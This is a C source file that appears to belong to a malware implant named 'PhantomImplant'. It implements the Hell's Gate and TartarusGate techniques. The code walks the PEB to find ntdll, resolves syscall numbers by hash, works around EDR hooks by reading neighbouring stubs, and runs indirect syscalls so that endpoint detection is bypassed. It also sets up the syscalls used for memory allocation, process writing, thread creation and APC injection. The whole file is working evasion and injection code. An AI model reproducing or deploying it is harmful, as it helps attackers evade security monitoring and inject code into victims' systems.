/**
 * PhantomImplant - Indirect Syscalls Module (HellsHall)
 *
 * Resolves SSNs dynamically at runtime using Hell's Gate + TartarusGate.
 * Handles hooked syscalls by checking neighbor functions.
 * Executes via indirect syscalls (jmp to ntdll's syscall instruction).
 *
 * Based on: MalDev Academy Modules 63, 66, 89
 * Techniques: Hell's Gate, TartarusGate (neighbor SSN), indirect syscall via jmp
 */

#include "syscalls.h"
#include "api.h"
#include <stdio.h>

// =============================================
// Global NTDLL config (cached export table)
// =============================================
NTDLL_CONFIG g_NtdllConf = { 0 };

// =============================================
// Global syscall table
// =============================================
NTAPI_FUNC g_Nt = { 0 };

// =============================================
// InitNtdllConfigStructure
// Caches ntdll's export table pointers for fast lookup.
// Gets ntdll base from PEB, then parses PE headers.
// =============================================
BOOL InitNtdllConfigStructure(VOID) {

    // Get PEB
#ifdef _WIN64
    PPEB pPeb = (PPEB)(__readgsqword(0x60));
#elif _WIN32
    PPEB pPeb = (PPEB)(__readfsdword(0x30));
#endif

    // Walk PEB->Ldr to find ntdll.dll
    // ntdll is always the second module loaded (after the exe itself)
    PPEB_LDR_DATA         pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

    // Skip first entry (the exe), get second (ntdll)
    pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);

    // ntdll base address
    g_NtdllConf.uModule = (ULONG_PTR)pDte->Reserved2[0];
    if (!g_NtdllConf.uModule)
        return FALSE;

    // Parse PE headers to get export directory
    PBYTE pBase = (PBYTE)g_NtdllConf.uModule;

    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pDosHdr->e_lfanew);
    if (pNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    // Cache export table arrays
    g_NtdllConf.pdwArrayOfAddresses = (PDWORD)(pBase + pExportDir->AddressOfFunctions);
    g_NtdllConf.pdwArrayOfNames     = (PDWORD)(pBase + pExportDir->AddressOfNames);
    g_NtdllConf.pwArrayOfOrdinals   = (PWORD)(pBase + pExportDir->AddressOfNameOrdinals);
    g_NtdllConf.dwNumberOfNames     = pExportDir->NumberOfNames;

    return TRUE;
}

// =============================================
// FetchNtSyscall
// Resolves a single syscall by hash value:
//   1. Finds the function in ntdll exports
//   2. Extracts SSN (handles 3 scenarios: clean, hook at byte 0, hook at byte 3)
//   3. Finds a random 'syscall' instruction in ntdll for indirect execution
//
// Hook handling (TartarusGate):
//   If the syscall is hooked (0xE9 = jmp at start), checks neighboring
//   syscalls up/down to calculate the correct SSN using the sequential
//   SSN property (SSN_B = SSN_A + 1).
// =============================================
BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys) {

    // Initialize ntdll config if not done
    if (!g_NtdllConf.uModule) {
        if (!InitNtdllConfigStructure())
            return FALSE;
    }

    if (dwSysHash != 0)
        pNtSys->dwSyscallHash = dwSysHash;
    else
        return FALSE;

    // Search ntdll exports for matching hash
    for (size_t i = 0; i < g_NtdllConf.dwNumberOfNames; i++) {

        PCHAR pcFuncName   = (PCHAR)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfNames[i]);
        PVOID pFuncAddress = (PVOID)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfAddresses[g_NtdllConf.pwArrayOfOrdinals[i]]);

        if (HASHA(pcFuncName) == dwSysHash) {

            pNtSys->pSyscallAddress = pFuncAddress;

            // ---- SCENARIO: UNHOOKED ----
            // Check for clean syscall stub: 4C 8B D1 B8 xx xx 00 00
            // mov r10, rcx ; mov eax, SSN
            if (*((PBYTE)pFuncAddress)     == 0x4C
                && *((PBYTE)pFuncAddress + 1) == 0x8B
                && *((PBYTE)pFuncAddress + 2) == 0xD1
                && *((PBYTE)pFuncAddress + 3) == 0xB8
                && *((PBYTE)pFuncAddress + 6) == 0x00
                && *((PBYTE)pFuncAddress + 7) == 0x00) {

                BYTE high = *((PBYTE)pFuncAddress + 5);
                BYTE low  = *((PBYTE)pFuncAddress + 4);
                pNtSys->dwSSn = (high << 8) | low;
                break;
            }

            // ---- SCENARIO: HOOKED at byte 0 (jmp at start) ----
            // EDR replaced first bytes with E9 xx xx xx xx (jmp to hook)
            if (*((PBYTE)pFuncAddress) == 0xE9) {

                for (WORD idx = 1; idx <= RANGE; idx++) {
                    // Check neighbor syscall DOWN (higher address)
                    if (*((PBYTE)pFuncAddress + idx * DOWN)     == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low  = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys->dwSSn = (high << 8) | (low - idx);
                        break;
                    }
                    // Check neighbor syscall UP (lower address)
                    if (*((PBYTE)pFuncAddress + idx * UP)     == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low  = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys->dwSSn = (high << 8) | (low + idx);
                        break;
                    }
                }
            }

            // ---- SCENARIO: HOOKED at byte 3 (jmp after mov r10, rcx) ----
            if (*((PBYTE)pFuncAddress + 3) == 0xE9) {

                for (WORD idx = 1; idx <= RANGE; idx++) {
                    // Check neighbor syscall DOWN
                    if (*((PBYTE)pFuncAddress + idx * DOWN)     == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low  = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys->dwSSn = (high << 8) | (low - idx);
                        break;
                    }
                    // Check neighbor syscall UP
                    if (*((PBYTE)pFuncAddress + idx * UP)     == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low  = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys->dwSSn = (high << 8) | (low + idx);
                        break;
                    }
                }
            }

            break; // Found our syscall, stop searching exports
        }
    }

    // Validate we found the syscall address
    if (!pNtSys->pSyscallAddress)
        return FALSE;

    // ---- INDIRECT SYSCALL: Find a random 'syscall' instruction in ntdll ----
    // Jump 0xFF bytes away from our syscall to find another function's syscall instruction.
    // This is what makes it "indirect" - we jmp to ntdll's memory instead of executing
    // the syscall instruction from our own binary.
    ULONG_PTR uFuncAddress = (ULONG_PTR)pNtSys->pSyscallAddress + 0xFF;

    for (DWORD z = 0, x = 1; z <= RANGE; z++, x++) {
        // 0F 05 = syscall instruction
        if (*((PBYTE)uFuncAddress + z) == 0x0F && *((PBYTE)uFuncAddress + x) == 0x05) {
            pNtSys->pSyscallInstAddress = (PVOID)((ULONG_PTR)uFuncAddress + z);
            break;
        }
    }

    // All fields must be populated for success
    if (pNtSys->dwSSn != 0 && pNtSys->pSyscallAddress != NULL
        && pNtSys->dwSyscallHash != 0 && pNtSys->pSyscallInstAddress != NULL)
        return TRUE;
    else
        return FALSE;
}

// =============================================
// InitializeNtSyscalls
// Populates all syscalls in the global g_Nt table.
// Call once at implant startup.
// =============================================
BOOL InitializeNtSyscalls(VOID) {

    if (!FetchNtSyscall(NtAllocateVirtualMemory_HASH, &g_Nt.NtAllocateVirtualMemory))
        return FALSE;

    if (!FetchNtSyscall(NtProtectVirtualMemory_HASH, &g_Nt.NtProtectVirtualMemory))
        return FALSE;

    if (!FetchNtSyscall(NtCreateThreadEx_HASH, &g_Nt.NtCreateThreadEx))
        return FALSE;

    if (!FetchNtSyscall(NtWaitForSingleObject_HASH, &g_Nt.NtWaitForSingleObject))
        return FALSE;

    if (!FetchNtSyscall(NtWriteVirtualMemory_HASH, &g_Nt.NtWriteVirtualMemory))
        return FALSE;

    if (!FetchNtSyscall(NtOpenProcess_HASH, &g_Nt.NtOpenProcess))
        return FALSE;

    if (!FetchNtSyscall(NtClose_HASH, &g_Nt.NtClose))
        return FALSE;

    if (!FetchNtSyscall(NtQuerySystemInformation_HASH, &g_Nt.NtQuerySystemInformation))
        return FALSE;

    if (!FetchNtSyscall(NtCreateSection_HASH, &g_Nt.NtCreateSection))
        return FALSE;

    if (!FetchNtSyscall(NtMapViewOfSection_HASH, &g_Nt.NtMapViewOfSection))
        return FALSE;

    if (!FetchNtSyscall(NtUnmapViewOfSection_HASH, &g_Nt.NtUnmapViewOfSection))
        return FALSE;

    if (!FetchNtSyscall(NtQueueApcThread_HASH, &g_Nt.NtQueueApcThread))
        return FALSE;

    if (!FetchNtSyscall(NtResumeThread_HASH, &g_Nt.NtResumeThread))
        return FALSE;

    if (!FetchNtSyscall(NtDelayExecution_HASH, &g_Nt.NtDelayExecution))
        return FALSE;

    return TRUE;
}
